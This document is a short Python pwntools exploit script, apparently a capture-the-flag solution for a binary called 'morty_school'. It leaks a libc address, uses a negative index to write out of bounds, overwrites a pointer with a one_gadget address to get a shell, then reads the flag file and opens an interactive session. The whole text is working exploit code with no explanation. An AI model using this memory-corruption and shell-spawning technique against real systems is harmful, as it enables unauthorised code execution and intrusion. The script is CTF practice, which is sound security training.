from pwn import *
import time

ip = "localhost"
port = 10003

r = remote(ip, port)
# r = process("./morty_school")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.arch = "amd64"

r.recvuntil(": ")
libc_base = int(r.recvline()[:-1], 16) - libc.sym.puts
info("libc base: {}".format(hex(libc_base)))

magic = libc_base + 0x10a38c

# (0x4005c0 - 0x6020a0) / 0x18
r.sendlineafter("teach?", str(-87668))
r.sendafter(":", p64(magic))
r.sendafter(":", "\x00" * 0x100)

time.sleep(0.5)
r.sendline("cat /home/`whoami`/flag")

r.interactive()
